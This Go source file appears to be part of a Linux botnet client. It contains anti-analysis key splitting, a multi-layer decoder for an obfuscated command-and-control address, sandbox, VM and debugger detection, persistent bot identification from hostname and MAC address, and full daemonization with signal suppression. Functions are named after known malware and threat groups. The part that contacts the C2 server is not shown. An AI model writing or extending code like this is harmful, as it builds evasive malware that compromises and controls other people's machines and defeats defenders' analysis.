package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
)

// ============================================================================
// ANTI-ANALYSIS: KEY DERIVATION FUNCTIONS
// These functions split the 32-byte AES-256 encryption key across multiple XOR
// operations to make static analysis more difficult. Each returns a single byte.
// ============================================================================

func mew() byte      { return byte(0x77 ^ 0x92) }  // patched by setup.py
func mewtwo() byte   { return byte(0x39 ^ 0xE8) }  // patched by setup.py
func celebi() byte   { return byte(0x62 ^ 0xB4) }  // patched by setup.py
func jirachi() byte  { return byte(0xA0 ^ 0x35) }  // patched by setup.py
func shaymin() byte  { return byte(0xD1 ^ 0xD3) }  // patched by setup.py
func phione() byte   { return byte(0xD4 ^ 0xFE) }  // patched by setup.py
func manaphy() byte  { return byte(0x56 ^ 0x56) }  // patched by setup.py
func victini() byte  { return byte(0x66 ^ 0xB0) }  // patched by setup.py
func keldeo() byte   { return byte(0xA8 ^ 0xDA) }  // patched by setup.py
func meloetta() byte { return byte(0xA9 ^ 0x1C) }  // patched by setup.py
func genesect() byte { return byte(0xB4 ^ 0x9D) }  // patched by setup.py
func diancie() byte  { return byte(0xE3 ^ 0x04) }  // patched by setup.py
func hoopa() byte    { return byte(0xB6 ^ 0xB6) }  // patched by setup.py
func volcanion() byte { return byte(0xB1 ^ 0x5A) }  // patched by setup.py
func magearna() byte { return byte(0x3A ^ 0x58) }  // patched by setup.py
func marshadow() byte { return byte(0x71 ^ 0x8B) }  // patched by setup.py
func zeraora() byte  { return byte(0xE3 ^ 0x80) }  // patched by setup.py
func zarude() byte   { return byte(0x55 ^ 0xD6) }  // patched by setup.py
func regieleki() byte { return byte(0x70 ^ 0xED) }  // patched by setup.py
func regidrago() byte { return byte(0x9F ^ 0xA3) }  // patched by setup.py
func glastrier() byte { return byte(0xC6 ^ 0xBA) }  // patched by setup.py
func spectrier() byte { return byte(0x0C ^ 0x79) }  // patched by setup.py
func calyrex() byte  { return byte(0x78 ^ 0x33) }  // patched by setup.py
func wyrdeer() byte  { return byte(0x27 ^ 0x5F) }  // patched by setup.py
func kleavor() byte  { return byte(0xDC ^ 0x63) }  // patched by setup.py
func ursaluna() byte { return byte(0x48 ^ 0x21) }  // patched by setup.py
func basculegion() byte { return byte(0x54 ^ 0xE4) }  // patched by setup.py
func sneasler() byte { return byte(0x11 ^ 0x3F) }  // patched by setup.py
func overqwil() byte { return byte(0x2D ^ 0x7A) }  // patched by setup.py
func enamorus() byte { return byte(0xB7 ^ 0xF3) }  // patched by setup.py
func tinkaton() byte { return byte(0x72 ^ 0x7F) }  // patched by setup.py
func annihilape() byte { return byte(0xE6 ^ 0x25) }  // patched by setup.py

// ============================================================================
// CRYPTOGRAPHIC FUNCTIONS
// ============================================================================

// charizard derives a 16-byte key from the seed string for venusaur C2 decoding.
// Uses MD5 intentionally — this is separate from the AES-256 garuda key.
func charizard(seed string) []byte {
	h := md5.New()
	h.Write([]byte(seed))
	h.Write([]byte{
		mew(), mewtwo(), celebi(), jirachi(),
		shaymin(), phione(), manaphy(), victini(),
		keldeo(), meloetta(), genesect(), diancie(),
		hoopa(), volcanion(), magearna(), marshadow(),
	})
	entropy := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE}
	for i := range entropy {
		entropy[i] ^= byte(len(seed) + i*17)
	}
	h.Write(entropy)
	return h.Sum(nil)
}

// garuda decrypts an AES-256-CTR encrypted blob.
// Input format: 16-byte IV ‖ ciphertext.
// Key: raw 32 bytes from the XOR derivation functions.
func garuda(encrypted []byte) []byte {
	if len(encrypted) <= aes.BlockSize {
		return nil
	}
	key := []byte{
		mew(), mewtwo(), celebi(), jirachi(),
		shaymin(), phione(), manaphy(), victini(),
		keldeo(), meloetta(), genesect(), diancie(),
		hoopa(), volcanion(), magearna(), marshadow(),
		zeraora(), zarude(), regieleki(), regidrago(),
		glastrier(), spectrier(), calyrex(), wyrdeer(),
		kleavor(), ursaluna(), basculegion(), sneasler(),
		overqwil(), enamorus(), tinkaton(), annihilape(),
	}
	iv := encrypted[:aes.BlockSize]
	ct := encrypted[aes.BlockSize:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	plaintext := make([]byte, len(ct))
	cipher.NewCTR(block, iv).XORKeyStream(plaintext, ct)
	return plaintext
}

// blastoise implements an RC4-like stream cipher for encryption/decryption.
func blastoise(data []byte, key []byte) []byte {
	s := make([]byte, 256)
	for i := range s {
		s[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(s[i]) + int(key[i%len(key)])) % 256
		s[i], s[j] = s[j], s[i]
	}
	result := make([]byte, len(data))
	i, j := 0, 0
	for k := range data {
		i = (i + 1) % 256
		j = (j + int(s[i])) % 256
		s[i], s[j] = s[j], s[i]
		result[k] = data[k] ^ s[(int(s[i])+int(s[j]))%256]
	}
	return result
}

// venusaur decodes the multi-layer obfuscated C2 address.
// Decoding layers (reverse order of encoding):
//
//	Layer 1: Base64 decode
//	Layer 2: XOR with rotating key
//	Layer 3: RC4 stream cipher decrypt
//	Layer 4: Reverse byte substitution (rotate right 3, XOR 0xAA)
//	Final: Verify MD5 checksum of payload
//
// Parameters:
//   - encoded: Base64 encoded obfuscated string from serviceAddr constant
//
// Returns: Decoded C2 address (e.g., "192.168.1.1:443") or empty string on error
func venusaur(encoded string) string {
	layer1, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return ""
	}
	key := charizard(configSeed)
	layer2 := make([]byte, len(layer1))
	for i := range layer1 {
		layer2[i] = layer1[i] ^ key[i%len(key)]
	}
	layer3 := blastoise(layer2, key)
	result := make([]byte, len(layer3))
	for i := range layer3 {
		b := layer3[i]
		b = ((b << 3) | (b >> 5))
		b ^= 0xAA
		result[i] = b
	}
	if len(result) < 5 {
		return ""
	}
	payload := result[:len(result)-4]
	checksum := result[len(result)-4:]
	h := md5.New()
	h.Write(payload)
	expected := h.Sum(nil)[:4]
	for i := range checksum {
		if checksum[i] != expected[i] {
			return ""
		}
	}
	return string(payload)
}

// ============================================================================
// ANTI-ANALYSIS & SANDBOX DETECTION
// ============================================================================

// winnti detects if the bot is running in a sandbox or analysis environment.
// Detection methods:
//  1. Check for VM indicators in process cmdlines (vmware, vbox, qemu, etc.)
//  2. Look for running analysis tools (strace, gdb, wireshark, etc.)
//  3. Check if parent process is a debugger
//
// Returns: true if sandbox/analysis detected, false if safe to run
func winnti() bool {
	if procs, err := os.ReadDir("/proc"); err == nil {
		for _, proc := range procs {
			if !proc.IsDir() {
				continue
			}
			if _, err := strconv.Atoi(proc.Name()); err != nil {
				continue
			}
			if cmdline, err := os.ReadFile(procPrefix + proc.Name() + cmdlineSuffix); err == nil {
				cmdStr := strings.ToLower(string(cmdline))
				for _, indicator := range sysMarkers {
					if strings.Contains(cmdStr, indicator) {
						deoxys("winnti: VM/sandbox indicator '%s' found in PID %s (cmdline: %s)", indicator, proc.Name(), strings.TrimSpace(cmdStr))
						return true
					}
				}
			}
		}
	}
	for _, tool := range procFilters {
		if _, err := os.Stat(tool); err == nil {
			if out, err := exec.Command(pgrepBin, pgrepFlag, filepath.Base(tool)).Output(); err == nil {
				pids := strings.TrimSpace(string(out))
				if len(pids) > 0 {
					deoxys("winnti: Analysis tool '%s' is running (PIDs: %s)", filepath.Base(tool), pids)
					return true
				}
			}
		}
	}
	if ppid := os.Getppid(); ppid > 1 {
		if cmdline, err := os.ReadFile(fmt.Sprintf(procPrefix+"%d"+cmdlineSuffix, ppid)); err == nil {
			parentCmd := strings.ToLower(string(cmdline))
			for _, debugger := range parentChecks {
				if strings.Contains(parentCmd, debugger) {
					deoxys("winnti: Parent process (PID %d) is debugger '%s' (cmdline: %s)", ppid, debugger, strings.TrimSpace(parentCmd))
					return true
				}
			}
		}
	}
	return false
}

// mustangPanda generates a unique 8-character bot identifier.
// Combines hostname and MAC address, then hashes with MD5.
// This ID persists across reboots for consistent bot tracking.
// Returns: 8-character hex string (first 8 chars of MD5 hash)
func mustangPanda() string {
	hostname, _ := os.Hostname()
	interfaces, _ := net.Interfaces()
	mac := "unknown"
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 && len(iface.HardwareAddr) > 0 {
			mac = iface.HardwareAddr.String()
			break
		}
	}
	data := fmt.Sprintf("%s:%s", hostname, mac)
	hash := fmt.Sprintf("%x", md5.Sum([]byte(data)))
	return hash[:8]
}

// ============================================================================
// DAEMONIZATION (UNIX)
// Full background daemonization: fork, setsid, close fds, ignore signals.
// ============================================================================

// stuxnet performs full Unix daemonization so the bot runs completely
// detached from any controlling terminal.
//

func stuxnet() {
	// Skip daemonization AND signal traps in debug mode so output stays
	// in the terminal and Ctrl-C exits cleanly.
	if verboseLog {
		return
	}

	// Already the daemon child – just finish housekeeping.
	if os.Getenv(envLabel) == "1" {
		daemonHousekeep()
		return
	}

	// --- Parent path: re-exec as a daemon child ---
	exe, err := os.Executable()
	if err != nil {
		// Can't determine our own path; fall through and run in foreground.
		return
	}

	// Set marker so the child knows it is the daemon.
	env := append(os.Environ(), envLabel+"=1")

	// Build the child process attributes: new session, detached.
	attr := &syscall.ProcAttr{
		Dir: "/",
		Env: env,
		Files: []uintptr{
			uintptr(devNull(os.O_RDONLY)), // stdin
			uintptr(devNull(os.O_WRONLY)), // stdout
			uintptr(devNull(os.O_WRONLY)), // stderr
		},
		Sys: &syscall.SysProcAttr{
			Setsid: true,
		},
	}

	// Fork+exec ourselves.
	_, _, forkErr := syscall.StartProcess(exe, os.Args, attr)
	if forkErr != nil {
		// Fork failed – just continue in the foreground.
		return
	}

	// Parent exits; child is now the daemon.
	os.Exit(0)
}

// daemonHousekeep performs post-fork housekeeping in the daemon child:
// chdir /, umask 0, reopen std fds to /dev/null, ignore signals.
func daemonHousekeep() {
	// Change working directory to root.
	syscall.Chdir("/")

	// Clear umask.
	syscall.Umask(0)

	// Re-open stdin/stdout/stderr to /dev/null (safety net).
	devNullFd := devNull(os.O_RDWR)
	if devNullFd >= 0 {
		syscall.Dup3(devNullFd, int(os.Stdin.Fd()), 0)
		syscall.Dup3(devNullFd, int(os.Stdout.Fd()), 0)
		syscall.Dup3(devNullFd, int(os.Stderr.Fd()), 0)
		if devNullFd > 2 {
			syscall.Close(devNullFd)
		}
	}

	// Ignore every signal we can.
	ignoreSignals()
}

// devNull opens /dev/null with the requested flags and returns the fd.
// Returns -1 on failure.
func devNull(flag int) int {
	fd, err := syscall.Open(devNullPath, flag, 0)
	if err != nil {
		return -1
	}
	return fd
}

// ignoreSignals tells the runtime to discard hangup, terminal, and user
// signals so the daemon survives terminal closes and stray signals.
//
// NOTE: SIGTERM is NOT ignored so that revilSingleInstance() can still
// kill an older daemonized instance when a new binary is deployed.
func ignoreSignals() {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig,
		syscall.SIGHUP,  // terminal hangup — must survive
		syscall.SIGINT,  // Ctrl-C — no terminal, but be safe
		syscall.SIGQUIT, // Ctrl-\ — ignore core dump request
		syscall.SIGUSR1, // user defined
		syscall.SIGUSR2, // user defined
		syscall.SIGTSTP, // Ctrl-Z — no terminal to suspend to
		syscall.SIGTTIN, // bg read from tty
		syscall.SIGTTOU, // bg write to tty
	)
	// Drain and discard in background.
	go func() {
		for range sig {
			// intentionally ignored
		}
	}()
}
